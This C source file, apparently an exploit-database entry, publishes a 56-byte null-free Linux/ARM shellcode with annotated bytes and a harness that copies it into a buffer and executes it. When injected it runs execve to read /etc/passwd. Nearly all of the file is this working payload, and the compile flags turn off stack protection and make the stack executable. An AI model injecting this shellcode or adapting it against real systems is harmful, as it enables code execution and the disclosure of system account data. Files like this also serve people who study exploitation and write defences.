/* 
    Title       : Linux/ARM - execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL) - 56 bytes
    Date        : 2020-10-30
    Author      : cpuu (cpuu at icloud dot com)
    Tested on   : Raspberry Pi 3 Model B Rev 1.2, armv7l, GNU/Linux raspberrypi 5.4.51-v7+, 32bit
    
    An ARM Hardcoded Shellcode without 0x20, 0x0a, and 0x00.
    
    https://github.com/cpuu/arm_exploitation/blob/master/shellcode/bincat/etcpasswd/etcpasswd.c

    compiler c: gcc -marm -fno-stack-protector -z execstack -o etcpasswd etcpasswd.c
    
*/
#include <stdio.h>
#include <string.h>

char *SC = "\x01\x30\x8f\xe2" // add  r3, pc, #1        /* add 0x1 to pc to prepare the switch to thumb mode */
           "\x13\xff\x2f\xe1" // bx   r3                /* switch to thumb mode */

           "\x24\x33" // adds r3,  #36 ; 0x24
           "\x78\x46" // mov  r0,  pc                   /* move pc to r0 */
           "\x16\x30" // adds r0,  #22                  /* make r0 to point to string */
           "\x92\x1a" // subs r2,  r2,  r2              /* put 0 in r2 */
           "\x02\x72" // strb r2,  [r0,  #8]            /* store /bin/cat to the stack */
           "\x05\x1c" // adds r5,  r0,  #0              /* make r5 to point to the beginning of string. */
           "\x14\x35" // adds r5,  #20                  /* make r5 to point to the end of string */
           "\x2a\x70" // strb r2,  [r5,  #0]            /* store nullbytes at the end of string */
           "\x69\x46" // mov  r1,  sp                   /* put "/bin/cat" in r1 (argv[0]) */9
           "\x8a\x60" // str  r2,  [r1,  #8]            /* put "/etc/passwd" in r2 (argv[1]) */
           "\x4b\x60" // str  r3,  [r1,  #4]            /* put NULL in r3 (envp) */
           "\x08\x60" // str  r0,  [r1,  #0]            /* put "/bin/cat" in r0 */
           "\x0b\x27" // movs r7,  #11                  /* put 11 in r7 for execve syscall */
           "\x01\xdf" // svc  1                         /* call execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL) */

           /* string "/bin/catx/etc/passwd" */
           "\x2f\x62\x69\x6e"  // .word    0x6e69622f   /* thumb instructions for "/bin" */
           "\x2f\x63\x61\x74"  // .word    0x7461632f   /* thumb instructions for "/cat" */
           "\x78\x2f\x65\x74"  // .word    0x74652f78   /* thumb instructions for "x/et" */
           "\x63\x2f\x70\x61"  // .word    0x61702f63   /* thumb instructions for "c/pa" */
           "\x73\x73\x77\x64"; // .word    0x64777373   /* thumb instructions for "sswd" */

int main(void)
{
    char payload[56];

    memcpy(payload, SC, 56);

    fprintf(stdout, "Length: %d\n", strlen(SC));
    (*(void (*)())payload)();

    return 0;
}

